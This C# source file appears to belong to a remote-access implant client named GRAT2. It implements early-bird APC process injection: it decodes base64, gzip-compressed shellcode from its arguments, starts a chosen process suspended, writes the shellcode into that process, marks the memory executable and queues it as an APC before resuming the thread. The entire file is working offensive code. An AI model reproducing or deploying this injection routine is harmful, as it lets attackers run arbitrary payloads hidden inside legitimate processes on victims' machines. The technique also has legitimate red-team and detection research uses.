using System;
using System.Runtime.InteropServices;
using GRAT2_Client.PInvoke;
using static GRAT2_Client.PInvoke.flags;

namespace GRAT2_Client.Injectious
{
    class UserAPC
    {
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;

        public static string InjectAPC(string[] arguments)
        {
            string targetProcess = arguments[2].Replace('+', ' ');

            byte[] buffer = DecGzip.DecompressGzipped(Convert.FromBase64String(arguments[1]));
            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            IntPtr lpThreadId = IntPtr.Zero;
            uint oldProtect = 0;

            STARTUPINFOEX si = new STARTUPINFOEX();
            flags.PROCESS_INFORMATION pi = new flags.PROCESS_INFORMATION();

            var processSecurity = new flags.SECURITY_ATTRIBUTES();
            var threadSecurity = new flags.SECURITY_ATTRIBUTES();
            processSecurity.nLength = Marshal.SizeOf(processSecurity);
            threadSecurity.nLength = Marshal.SizeOf(threadSecurity);

            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
            IntPtr pinnedBuffer = handle.AddrOfPinnedObject();

            try
            {
                bool success = Interop.CreateProcess(targetProcess, null, ref processSecurity, ref threadSecurity, false, flags.ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | flags.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
                IntPtr resultPtr = Interop.VirtualAllocEx(pi.hProcess, IntPtr.Zero, buffer.Length, MEM_COMMIT, PAGE_READWRITE);
                IntPtr bytesWritten = IntPtr.Zero;
                bool resultBool = Interop.WriteProcessMemory(pi.hProcess, resultPtr, pinnedBuffer, buffer.Length, out bytesWritten);

                IntPtr sht = Interop.OpenThread(flags.ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);

                resultBool = Interop.VirtualProtectEx(pi.hProcess, resultPtr, buffer.Length, PAGE_EXECUTE_READ, out oldProtect);

                IntPtr ptr = Interop.QueueUserAPC(resultPtr, sht, IntPtr.Zero);
                IntPtr ThreadHandle = pi.hThread;
                Interop.ResumeThread(ThreadHandle);

                handle.Free();

            }
            catch (Exception ex)
            {
                handle.Free();
                Console.WriteLine(ex.Message);
            }

            return null;

        }
    }
}
